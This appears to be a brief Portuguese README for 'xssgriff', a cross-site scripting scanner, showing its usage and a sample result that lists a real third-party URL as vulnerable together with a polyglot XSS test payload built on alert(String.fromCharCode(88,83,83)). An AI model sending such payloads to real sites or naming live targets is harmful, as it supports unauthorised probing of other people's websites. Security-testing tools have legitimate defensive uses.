python;)
                          _  __ 
 __  _____ ___  __ _ _ __(_)/ _|
 \ \/ / __/ __|/ _` | '__| | |_ 
  >  <\__ \__ \ (_| | |  | |  _|
 /_/\_\___/___/\__, |_|  |_|_|  
               |___/            


xssgriff
Xssgriff, script para analizar vulnerabilidade em XSS.

Modo de uso:
python xss.py 
url : teste.com.br

URL: http://www.koinonia.org.br/tpdigital/detalhes.asp?cod_artigo=161&cod_boletim=9&tipo=
Vulneravel: ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>


https://www.facebook.com/JRPENTESTER
